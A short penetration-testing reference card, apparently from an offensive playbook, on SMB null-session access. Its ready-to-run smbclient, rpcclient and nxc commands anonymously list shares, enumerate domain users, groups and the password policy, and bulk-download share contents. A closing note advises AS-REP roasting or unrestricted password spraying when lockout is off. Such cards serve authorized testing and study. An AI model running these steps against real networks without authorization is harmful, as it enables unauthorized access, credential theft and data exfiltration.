---
id: null-session
title: SMB Null Session
stage: initial-access
tags: [windows, smb]
tools:
  - smbclient //$TARGET/ShareName -U '' -N
  - rpcclient -U "" -N $TARGET -c "enumdomusers"
  - nxc smb $TARGET -u '' -p '' --shares
leads_to:
  - rev-shell
  - password-spray
  - windows-gpp-creds
---

## Null Session Access

```bash
# List shares as null session
smbclient -L //$TARGET/ -U '' -N
nxc smb $TARGET -u '' -p '' --shares

# RPC null session — enumerate users, groups, policies
rpcclient -U "" -N $TARGET
> enumdomusers    # user list
> enumdomgroups   # group list
> getdompwinfo    # password policy

# If null fails, try guest with any username
nxc smb $TARGET -u 'anon' -p '' --shares   # Windows Guest account
```

## Download Share Contents

```bash
# Mount
smbclient //$TARGET/ShareName -U '' -N
> recurse ON
> ls
> mget *
```

## Notes

Null session → user list → AS-REP roasting or password spray. The bigger value is the password policy — if lockout threshold is 0, spray freely.
